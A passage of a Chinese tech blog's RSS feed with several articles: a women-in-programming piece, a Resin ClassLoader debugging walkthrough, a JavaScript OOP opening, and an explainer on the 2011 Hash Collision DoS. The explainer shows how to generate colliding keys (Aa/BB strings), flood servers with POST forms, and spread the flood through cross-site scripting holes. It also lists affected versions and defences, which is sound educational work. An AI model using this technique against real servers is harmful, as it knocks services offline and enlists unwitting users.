<p>那就是更值钱。</p>
<p>关同学用事实告诉我：一名战士完全可以是一支军队。没错。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Zheng_-_%E6%B0%B8%E4%B8%8D%E6%94%BE%E5%BC%83%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%B7%A5%E4%BD%9C"></span>Zheng – 永不放弃程序员的工作<span class="ez-toc-section-end"></span>
</h5>
<p>从工作年限来说，我还不能算是一个程序员，因为现在还是一个大四的学生。但是我已经认定了程序员的这条道路。<br>
高考结束后考虑专业问题，那时我的兴趣是文学，但是因为现实社会的关系和家庭经济的原因，我在毕业生收入排行榜上选择了平均收入最高的专业，软件工程。大一时懵懵懂懂，挂了很多科目，重修，从大二起开始拿奖学金，开始参加项目。因为大一评奖学金时看到自己排在倒数第二的位置，看到同班的同学参加各种软件比赛，我那时就开始思考，我在做什么？于是开始疯狂地写程序，重新学基础知识，认真上课，经常去看一些IT博客。在一家公司实习，我开始接触分布式系统的东西，那时leader让我一个人负责这一块，我就像实验的小白鼠的一样，但是我却感到很如鱼得水，我喜欢快速掌握一门新的领域，并学会总结。那是我真正意义上的在linux下的开发工作，学会了c网络编程，shell，python，hadoop,hive。那里的开发团队只有我一个女生，我见识到一个优秀的程序员所应该具备的一些素质，对技术热点的掌握，对产品的敏锐，不仅是代码，而且是融入产品的设计中，能提出作为一名开发者的意见。如果说作为一个女程序，我与他们不同之处，恐怕是得到更多的照顾，也学到很多。</p>
<p>实习两三个月后，我选择离职，在我看来，没有毕业的我实习就是一个新的课程，工作经验就像是旅程，经历的风景是阅历，也是财富。我选择了去一家做云存储服务的公司，在那边更深入地了解关于分布式系统的知识，而这些知识的获取是我自己间接得到的，并非公司培训。我刚到那里，发现还有另一个女程序，她很活泼，而且在项目开发中占据很重要的位置。从一个程序员的角度出发，我并不觉得会写代码是一件多么厉害的事，重要的是上手的能力，系统设计的能力，构架高性能的能力。而基础这些东西只要是一个智力水平相当的人，通过一定时间的磨练，都有可能掌握的。这家公司的资源很丰盛，我的任务并不多，更多的时间是自我学习和研究毕设课题。因为leader没有放手让我干活，干的只要是python脚本的一些开发，所以每次任务来的时候我都很快完成，一般leader上午给任务，下午下班前我就可以提交代码，剩下时间就做自己喜欢的c/c++的cli小应用和一些nosql开源项目。有时一个程序出错，就很偏执地想把错误找出来以后再收工，导致吃饭误点，这样的习惯对身体很不好，现在也正在努力改正中。工作经历差不多就是这些,不介意的话讲一下求职经历。</p>
<p>我去面试时，很多面试官都会问我，女生做开发人员的问题。我想这本来就不是一个问题，作为一个人，你需要养家糊口，我也需要。我也有自己的职业规划，清楚知道自己想要什么。从懵懂到略知一二，到准备跳进火坑里塑造一个雷厉风行的新的自我。我一直相信人的某些性质是会变的，随着阅历，经历，实践的不同也产生质的改变。你现在看到的是一个弱女子，未必将来你不会看到一个女架构师。这些都是在进入hr面以后经常会和hr聊到的东西。这份工作能体现我的价值，我就来了。这就是我求职一路的态度。后来成功拿到一些公司的offer。</p>
<p>在未来的职场上，我也会不放弃程序员这份工作。学习的态度，认真负责的做事风格，即便我不是一个天才工程师，也可以成为优秀的程序员，不用刻意加“女”字。</p>
</div>
<h5 style="color: #cc0000; text-align: center; font-size: 20px; margin: 30px 0px;">
<span class="ez-toc-section" id="%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BB%AC%EF%BC%8C%E4%B8%BA%E4%BD%A0%E4%BB%AC%E9%AA%84%E5%82%B2%EF%BC%8C%E7%A5%9D%E4%BD%A0%E4%BB%AC2012%E5%B9%B4%E6%9B%B4%E4%B8%8A%E4%B8%80%E5%B1%82%E6%A5%BC%E3%80%82"></span>女程序员们，为你们骄傲，祝你们2012年更上一层楼。<span class="ez-toc-section-end"></span>
</h5>
<p><strong>（另外，请各种网站、媒体，报刊，杂志，自由转载或是选取其中的故事做为你们的素材）</strong></p>
 ]]></content>
<pubDate>2012-01-04T08:29:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/6346.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Resin服务器getResource揭秘 ]]></title>
<link>https://coolshell.cn/articles/6335.html</link>
<content><![CDATA[ 
<p><strong>（<span style="color: #cc0000;">感谢网友 liuxiaori 继续分享其经历</span>）这样的详细的图文并茂的文章让我很佩服！</strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%89%8D%E8%A8%80" title="前言">前言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83" title="调试环境">调试环境</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E5%BC%80%E5%A7%8B" title="开始">开始</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#1_thisgetClassgetResourcegetPath" title="1) this.getClass().getResource(“/”).getPath()">1) this.getClass().getResource(“/”).getPath()</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#1_thisgetClassgetResourceAsStreamatxt" title="1) this.getClass().getResourceAsStream(“/a.txt”)">1) this.getClass().getResourceAsStream(“/a.txt”)</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%89%8D%E8%A8%80"></span>前言<span class="ez-toc-section-end"></span>
</h4>
<p>接上文“<a title="由一个问题到 Resin ClassLoader 的学习" href="https://coolshell.cn/articles/6112.html" target="_blank">由一个问题到Resin ClassLoader的学习</a>”，本文将以this.getClass().getResource(“/”).getPath()和this.getClass().getResourceAsStream(“/a.txt”)为例，一步步解析加载的过程。</p>
<h4>
<span class="ez-toc-section" id="%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"></span>调试环境<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>下载resin3.0.23的源码(<a href="http://www.caucho.com/download/resin-3.0.23-src.zip">http://www.caucho.com/download/resin-3.0.23-src.zip</a>)。</li>
<li>部署到myeclipse中，有错误，本人忽略了。Resin可运行。</li>
<li>将EhCacheTestAnnotation部署到resin3.0.23中。</li>
<li>调试this.getClass().getResource(“/”).getPath()。</li>
</ol>
<p>问题来了，无论如何也模拟不出来&lt;compiling-loader&gt;所造成的影响，一直输出：/D:/work_other/project/resin-3.0.23/bin/ 。无奈之下，采用了这种方式：使用两个eclipse，一个使用发布版本的，部署EhCacheTestAnnotation进行调试；另外一个部署resin3.0.23源码，调试到哪里对照看源码。</p>
<h4>
<span class="ez-toc-section" id="%E5%BC%80%E5%A7%8B"></span>开始<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="1_thisgetClassgetResourcegetPath"></span>1) this.getClass().getResource(“/”).getPath()<span class="ez-toc-section-end"></span>
</h5>
<p>本次调试涉及的所有类加载器为：</p>
<blockquote>
<p>EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]</p>
<p>EnvironmentClassLoader$7806641[host:http://localhost:8787]</p>
<p>EnvironmentClassLoader$22459270[servlet-server:]</p>
<p><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b2c1c7dc9cdfdbc1d19cfed3c7dcd1dad7c096f3c2c2f1ded3c1c1feddd3d6d7c0f28580878bd6d3">[email protected]</a></p>
<p><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="84f7f1eaaae9edf7e7aac8e5f1eae7ece1f6a0c1fcf0c7e8e5f7f7c8ebe5e0e1f6c4b5b2bdb7b4e1b6">[email protected]</a></p>
</blockquote>
<p>首先进入Class的getResource(String name)方法，如下图：</p>
<p><span id="more-6335"></span></p>
<figure id="attachment_6390" aria-describedby="caption-attachment-6390" style="width: 553px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6390" class="wp-caption-text">图1</figcaption></figure>
<p>最后委托给ClassLoader的getResource方法。那么这个ClassLoader是哪个呢？一看下图便知：</p>
<figure id="attachment_6391" aria-describedby="caption-attachment-6391" style="width: 553px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6391" class="wp-caption-text">图2</figcaption></figure>
<p>是DynamicClassLoader的getResource方法，原理上文已述。</p>
<p>最终会委托给<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5320263d7d3e3a20307d1f32263d303b362177162b27103f3220201f3c323736211362656a60633661">[email protected]</a>类加载器的getResource方法，返回null，然后开始回溯。</p>
<p>还记得吗？当java.net.URLClassLoader分支的ClassLoader的getResource方法返回值为null后，就要遍历嵌入DynamicClassLoader中的Resin的Loader(即_loaders集合)。</p>
<p>当然回溯到EnvironmentClassLoader$22459270[servlet-server:]中，那么它中_loaders这个集合中的Loader又有哪些呢？</p>
<p>以图为证，当天确实回溯到该ClassLoader，而且开始准备遍历_loaders集合。</p>
<figure id="attachment_6392" aria-describedby="caption-attachment-6392" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6392" class="wp-caption-text">图3</figcaption></figure>
<p>DynamicClassLoader的1306行，没问题，resin3.0.23源码截图为证：</p>
<figure id="attachment_6393" aria-describedby="caption-attachment-6393" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6393" class="wp-caption-text">图4</figcaption></figure>
<p>不做多余解释，那么“servlet-server”这个ClassLoader中的_loaders集合中都放了一些什么呢？</p>
<figure id="attachment_6394" aria-describedby="caption-attachment-6394" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6394" class="wp-caption-text">图5</figcaption></figure>
<p>存放了两个TreeLoader(Loader的子类)，然未找到结果，返回null。继续回溯。</p>
<p>这次轮到遍历EnvironmentClassLoader$7806641[host:http://localhost:8787]的_loaders。下图为证：</p>
<figure id="attachment_6395" aria-describedby="caption-attachment-6395" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6395" class="wp-caption-text">图6</figcaption></figure>
<p>_loaders中的内容如下图：</p>
<figure id="attachment_6396" aria-describedby="caption-attachment-6396" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6396" class="wp-caption-text">图7</figcaption></figure>
<p>比较长，我贴出来：</p>
<blockquote><p>[CompilingLoader[src:/D:/work/resin-3.0.23/webapps/WEB-INF/classes], LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="24474b490a474551474c4b0a474b4a424d430a505d5441570a624d4841774150705d544164424612131217">[email protected]</a>], CompilingLoader[src:/D:/work/resin-3.0.23/webapps/WEB-INF/classes], LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b0d3dfdd9ed3d1c5d3d8df9ed3dfded6d9d79ec4c9c0d5c39ef6d9dcd5e3d5c4e4c9c0d5f0818480d288d6d4">[email protected]</a>], CompilingLoader[src:/D:/work/resin-3.0.23/webapps/WEB-INF/classes], LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6f0c0002410c0e1a0c0700410c0001090608411b161f0a1c412906030a3c0a1b3b161f0a2f5c5f090c5e09">[email protected]</a>]]</p></blockquote>
<p>注意到了吧，主角来了。那仔细调试下把。爆料一下：CompilingLoader[src:/D:/work/resin-3.0.23/webapps/WEB-INF/classes]就是主角。</p>
<figure id="attachment_6397" aria-describedby="caption-attachment-6397" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6397" class="wp-caption-text">图8</figcaption></figure>
<p>看到了吧，遍历时，当前的Loader为CompilingLoader[src:/D:/work/resin-3.0.23/webapps/WEB-INF/classes]，而且url可是不为null了哦。再贴一张，看看url的值到底是什么！</p>
<figure id="attachment_6400" aria-describedby="caption-attachment-6400" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6400" class="wp-caption-text">图9</figcaption></figure>
<p>嗯，不用多做解释了吧。</p>
<p>最后看看程序输出是否吻合，如下图：</p>
<figure id="attachment_6401" aria-describedby="caption-attachment-6401" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6401" class="wp-caption-text">图10</figcaption></figure>
<p>然后修改resin.conf中的&lt;compiling-loader&gt;将其注释掉，看看程序结果会不会是我们期望的：/D:/work/resin-3.0.23/webapps/EhCacheTestAnnotation/WEB-INF/classes/。拭目以待。</p>
<figure id="attachment_6402" aria-describedby="caption-attachment-6402" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6402" class="wp-caption-text">图11</figcaption></figure>
<p>为节省篇幅，一下只关注关键位置。</p>
<p>首先调试到EnvironmentClassLoader$7806641[host:http://localhost:8787]，我们需要停下来一下。</p>
<figure id="attachment_6403" aria-describedby="caption-attachment-6403" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6403" class="wp-caption-text">图12</figcaption></figure>
<p>再看一下_loaders的值。</p>
<figure id="attachment_6404" aria-describedby="caption-attachment-6404" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6404" class="wp-caption-text">图13</figcaption></figure>
<p>贴一个详细的：</p>
<blockquote><p>[LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bfdcd0d291dcdecadcd7d091dcd0d1d9d6d891cbc6cfdacc91f9d6d3daecdacbebc6cfdaff8e8d8686d988da">[email protected]</a>], LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="73101c1e5d101206101b1c5d101c1d151a145d070a0316005d351a1f16201607270a03163342124540421010">[email protected]</a>], LibraryLoader[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="65060a084b060410060d0a4b060a0b030c024b111c1500164b230c0900360011311c1500250353565c5d">[email protected]</a>]]</p></blockquote>
<p>对比一下，在注释掉&lt;compiling-loader&gt;后，loaders中是没有CompilingClassLoader实例的。</p>
<p>继续，下面就轮到EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]这个ClassLoader了，会是什么样子呢？</p>
<figure id="attachment_6405" aria-describedby="caption-attachment-6405" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6405" class="wp-caption-text">图14</figcaption></figure>
<p>进入该ClassLoader时，url值依旧为null，那_loaders会有变化吗？如下图：</p>
<figure id="attachment_6406" aria-describedby="caption-attachment-6406" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6406" class="wp-caption-text">图15</figcaption></figure>
<p>继续遍历_loaders。</p>
<figure id="attachment_6407" aria-describedby="caption-attachment-6407" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6407" class="wp-caption-text">图16</figcaption></figure>
<p>到这里就结束了，url在EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]中被加载。</p>
<h5>
<span class="ez-toc-section" id="1_thisgetClassgetResourceAsStreamatxt"></span>1) this.getClass().getResourceAsStream(“/a.txt”)<span class="ez-toc-section-end"></span>
</h5>
<p>getResourceAsStream(String name)方法也是采用双亲委派的方式。在前一篇文章中提出“getResourceAsStream可是将获取路径委托给getResource，&lt;compiling-loader&gt;却没有对getResourceAsStream产生影响”</p>
<p>ClassLoader中getResourceAsStream源码也确实是委托为getResource了，可是为什么呢？</p>
<p>getResourceAsStream(String name)方法。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public InputStream getResourceAsStream(String name) {
    URL url = getResource(name);
    try {
        return url != null ? url.openStream() : null;
    } catch (IOException e) {
        return null;
    }
}
</pre>
<p>其实不难解释，JVM中ClassLoader的getResourceAsStream(“/a.txt”)返回了null，然后开始回溯，与getResource方法的原理一致，直到某个ClassLoader及其子类或者Loader及其子类找到了”/a.txt”，并以流的形式返回，当然谁都没找到就返回null。</p>
<p>捡重点的说。</p>
<p>调试到<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aedddbc080c3c7ddcd80e2cfdbc0cdc6cbdc8aefdedeedc2cfdddde2c1cfcacbdcee9f96ca9f9e99c8">[email protected]</a>，即ClassLoader的子类，情形如下图：</p>
<figure id="attachment_6408" aria-describedby="caption-attachment-6408" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6408" class="wp-caption-text">图17</figcaption></figure>
<p>看见getResource(name)喽，按F5进去看个究竟。如下图，其parent为：<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d5a6a0bbfbb8bca6b6fb99b4a0bbb6bdb0a7f190ada196b9b4a6a699bab4b1b0a795e6e3e5b7b0e5">[email protected]</a>，其返回null。</p>
<figure id="attachment_6398" aria-describedby="caption-attachment-6398" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6398" class="wp-caption-text">图18</figcaption></figure>
<p>开始回溯到：EnvironmentClassLoader$1497769[servlet-server:]，与getResource方法一致，开始遍历_loaders集合。</p>
<p>这样就可以解释为何&lt;compiling-loader&gt;没有影响到getResourceAsStream了。因为资源(这里是/a.txt)，就不是由AppClassLoader和ExtClassLoader加载的，而是由DynamicClassLoader或者其内部的_loaders集合完成的加载。或者更确切的说是由CompilingClassLoader获取到的URL，再转换成InputStream。</p>
<p><span style="color: #ff0000;"><strong>&lt;comiling-loader&gt;其实对getResourceAsStream还是有点影响的，如果配置中配置了&lt;comiling-loader&gt;，并且&lt;comiling-loader&gt;配置的路径下，与实际项目的指定路径下，都放置了同名资源，则会先加载&lt;comiling-loader&gt;配置路径下的资源。</strong></span></p>
<p>比如，下图所示：</p>
<figure id="attachment_6399" aria-describedby="caption-attachment-6399" style="width: 554px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6399" class="wp-caption-text">图19</figcaption></figure>
<p>&lt;compiling-loader&gt;配置的路径为：&lt;compiling-loader path=”webapps/WEB-INF/classes”/&gt;</p>
<p>在加载”/a.txt”时，优先加载webapps/WEB-INF/classes/a.txt。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>&lt;compiling-loader&gt;如被注释掉，则只会在EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]中的_loaders中被初始化，否则会在EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]和EnvironmentClassLoader$7806641[host:http://localhost:8787两个类加载器各自的_loaders集合中被初始化。(通过调试this.getClass().getResource(“/test”).getPath()验证)</li>
<li>&lt;compiling-loader&gt;未注释掉，”/”(根路径)由EnvironmentClassLoader$7806641[host:http://localhost:8787]加载，注释掉后由EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]加载。</li>
<li>EnvironmentClassLoader$7806641[host:http://localhost:8787]为Resin server的类加载器实例，EnvironmentClassLoader$24156236[web-app:http://localhost:8787/EhCacheTestAnnotation]为Web应用程序的类加载器实例。他们都属于java.net.URLClassLoader的实例。</li>
<li>&lt;compiling-loader&gt;某种程度上对getResourceAsStream方法有影响。</li>
</ol>
<p>现在&lt;compiling-loader&gt;如何影响getResource(“/”)，以及getResourceAsStream“不”被影响全部真相大白。</p>
<p><span style="color: #ff0000;">注：&lt;compiling-loader&gt;只对获取根路径产生影响，也就是参数为”/”。比如加载”/test/Path.class”不会产生影响。</span></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-01-05T08:28:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/6335.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Hash Collision DoS 问题 ]]></title>
<link>https://coolshell.cn/articles/6424.html</link>
<content><![CDATA[ 
<p>最近，除了国内明文密码的安全事件，还有一个事是比较大的，那就是 Hash Collision DoS （Hash碰撞的拒绝式服务攻击），有恶意的人会通过这个安全弱点会让你的服务器运行巨慢无比。<strong>这个安全弱点利用了各语言的Hash算法的“非随机性”可以制造出N多的value不一样，但是key一样数据，然后让你的Hash表成为一张单向链表，而导致你的整个网站或是程序的运行性能以级数下降（可以很轻松的让你的CPU升到100%）</strong>。目前，这个问题出现于<a href="https://www.java.com/">Java</a>, <a href="http://jruby.org/">JRuby</a>, <a href="http://www.php.net/">PHP</a>, <a href="https://python.org/">Python</a>, <a href="http://rubini.us/">Rubinius</a>, <a href="https://www.ruby-lang.org/">Ruby</a>这些语言中，主要：</p>
<ul>
<li>
<a href="https://www.java.com">Java</a>, 所有版本</li>
<li>
<a href="http://jruby.org/">JRuby</a> &lt;= 1.6.5 （目前fix在 1.6.5.1）</li>
<li>
<a href="http://www.php.net/">PHP</a> &lt;= 5.3.8, &lt;= 5.4.0RC3 （目前fix在 5.3.9,  5.4.0RC4）</li>
<li>
<a href="https://python.org/">Python</a>, all versions</li>
<li>
<a href="http://rubini.us/">Rubinius</a>, all versions</li>
<li>
<a href="https://www.ruby-lang.org/">Ruby</a> &lt;= 1.8.7-p356 （目前fix在 1.8.7-p357, 1.9.x）</li>
<li>
<a href="http://geronimo.apache.org/">Apache Geronimo</a>, 所有版本</li>
<li>
<a href="https://tomcat.apache.org/">Apache Tomcat</a> &lt;= 5.5.34, &lt;= 6.0.34, &lt;= 7.0.22 （目前fix在 5.5.35,  6.0.35,  7.0.23）</li>
<li>
<a href="https://glassfish.java.net/">Oracle Glassfish</a> &lt;= 3.1.1 （目前fix在mainline）</li>
<li>
<a href="https://www.eclipse.org/jetty/">Jetty</a>, 所有版本</li>
<li>
<a href="https://plone.org/">Plone</a>, 所有版本</li>
<li>
<a href="http://rack.rubyforge.org/">Rack</a> &lt;= 1.3.5, &lt;= 1.2.4, &lt;= 1.1.2 （目前fix 在 1.4.0, 1.3.6, 1.2.5, 1.1.3）</li>
<li>
<a href="https://code.google.com/p/v8/">V8 JavaScript Engine</a>, 所有版本</li>
<li>ASP.NET 没有打MS11-100补丁</li>
</ul>
<p>注意，Perl没有这个问题，因为Perl在N年前就fix了这个问题了。关于这个列表的更新，请参看 <a href="http://www.ocert.org/advisories/ocert-2011-003.html" target="_blank">oCERT的2011-003报告</a>，比较坑爹的是，这个问题早在2003 年就在论文《<a href="http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf" target="_blank">通过算法复杂性进行拒绝式服务攻击</a>》中被报告了，但是好像没有引起注意，尤其是Java。</p>
<h4>弱点攻击解释</h4>
<p>你可以会觉得这个问题没有什么大不了的，因为黑客是看不到hash算法的，如果你这么认为，那么你就错了，这说明对Web编程的了解还不足够底层。</p>
<p><span id="more-6424"></span></p>
<p>无论你用JSP，PHP，Python，Ruby来写后台网页的时候，在处理HTTP POST数据的时候，你的后台程序可以很容易地以访问表单字段名来访问表单值，就像下面这段程序一样：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">
$usrname = $_POST['username'];
$passwd = $_POST['password'];

</pre>
<p>这是怎么实现的呢？这后面的东西就是Hash Map啊，所以，我可以给你后台提交一个有10K字段的表单，这些字段名都被我精心地设计过，他们全是Hash Collision ，于是你的Web Server或语言处理这个表单的时候，就会建造这个hash map，于是在每插入一个表单字段的时候，都会先遍历一遍你所有已插入的字段，于是你的服务器的CPU一下就100%了，你会觉得这10K没什么，那么我就发很多个的请求，你的服务器一下就不行了。</p>
<p>举个例子，你可能更容易理解：</p>
<p>如果你有n个值—— v1, v2, v3, … vn，把他们放到hash表中应该是足够散列的，这样性能才高：</p>
<blockquote><p>0 -&gt; v2<br>
1 -&gt; v4<br>
2 -&gt; v1<br>
…<br>
…<br>
n -&gt; v(x)</p></blockquote>
<p>但是，这个攻击可以让我造出N个值——  dos1, dos2, …., dosn，他们的hash key都是一样的（也就是Hash Collision），导致你的hash表成了下面这个样子：</p>
<blockquote><p>0 – &gt; dos1 -&gt; dos2 -&gt; dos3 -&gt; …. -&gt;dosn<br>
1 -&gt; null<br>
2 -&gt; null<br>
…<br>
…<br>
n -&gt; null</p></blockquote>
<p>于是，单向链接就这样出现了。这样一来，O(1)的搜索算法复杂度就成了O(n)，而插入N个数据的算法复杂度就成了O(n^2)，你想想这是什么样的性能。</p>
<p>（关于Hash表的实现，如果你忘了，那就把大学时的《数据结构》一书拿出来看看）</p>
<h4>  Hash Collision DoS 详解</h4>
<p>StackOverflow.com是个好网站， 合格的程序员都应该知道这个网站。上去一查，就看到了这个贴子“<a title="Application vulnerability due to Non Random Hash Functions" href="https://stackoverflow.com/questions/8669946/application-vulnerability-due-to-non-random-hash-functions" target="_blank">Application vulnerability due to Non Random Hash Functions</a>”。我把这个贴子里的东西摘一些过来。</p>
<p>首先，这些语言使用的Hash算法都是“非随机的”，如下所示，这个是Java和Oracle使用的Hash函数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static int hash(int h)
{
h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
}</pre>
<p>所谓“非随机的” Hash算法，就可以猜。比如：</p>
<p>1）在Java里， Aa和BB这两个字符串的hash code(或hash key) 是一样的，也就是Collision 。</p>
<p>2）于是，我们就可以通过这两个种子生成更多的拥有同一个hash key的字符串。如：”AaAa”, “AaBB”, “BBAa”, “BBBB”。这是第一次迭代。其实就是一个排列组合，写个程序就搞定了。</p>
<p>3）然后，我们可以用这4个长度的字符串，构造8个长度的字符串，如下所示：</p>
<pre style="padding-left: 30px;"><code>"AaAaAaAa", "AaAaBBBB", "AaAaAaBB", "AaAaBBAa", 
"BBBBAaAa", "BBBBBBBB", "BBBBAaBB", "BBBBBBAa", 
"AaBBAaAa", "AaBBBBBB", "AaBBAaBB", "AaBBBBAa", 
"BBAaAaAa", "BBAaBBBB", "BBAaAaBB", "BBAaBBAa",</code></pre>
<p><code>4）同理，我们就可以生成16个长度的，以及256个长度的字符串，总之，很容易生成N多的这样的值。</code></p>
<p>在攻击时，我只需要把这些数据做成一个HTTP POST 表单，然后写一个无限循环的程序，不停地提交这个表单。你用你的浏览器就可以了。当然，如果做得更精妙一点的话，把你的这个表单做成一个跨站脚本，然后找一些网站的跨站漏洞，放上去，于是能过SNS的力量就可以找到N多个用户来帮你从不同的IP来攻击某服务器。</p>
<p> </p>
<h4>防守</h4>
<p>要防守这样的攻击，有下面几个招：</p>
<ul>
<li>打补丁，把hash算法改了。</li>
<li>限制POST的参数个数，限制POST的请求长度。</li>
<li>最好还有防火墙检测异常的请求。</li>
</ul>
<p>不过，对于更底层的或是其它形式的攻击，可能就有点麻烦了。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-01-06T08:36:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/6424.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript 面向对象编程 ]]></title>
<link>https://coolshell.cn/articles/6441.html</link>
<content><![CDATA[ 
<p>Javascript是一个类C的语言，他的面向对象的东西相对于C++/Java比较奇怪，但是其的确相当的强大，在 <a href="https://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a>的“<a title="对象的消息模型" href="https://coolshell.cn/articles/5202.html" rel="bookmark" target="_blank">对象的消息模型</a>”一文中我们已经可以看到一些端倪了。这两天有个前同事总在问我Javascript面向对象的东西，所以，索性写篇文章让他看去吧，这里这篇文章主要想从一个整体的角度来说明一下Javascript的面向对象的编程。（<strong>成文比较仓促，应该有不准确或是有误的地方，请大家批评指正</strong>）</p>
<p>另，这篇文章主要基于 <a href="https://www.ecma-international.org/publications/standards/Ecma-262.htm" target="_blank">ECMAScript 5</a>， 旨在介绍新技术。关于兼容性的东西，请看最后一节。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%88%9D%E6%8E%A2" title="初探">初探</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE_-_ObjectdefineProperty" title="属性配置 – Object.defineProperty">属性配置 – Object.defineProperty</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#GetSet_%E8%AE%BF%E9%97%AE%E5%99%A8" title="Get/Set 访问器">Get/Set 访问器</a></li>
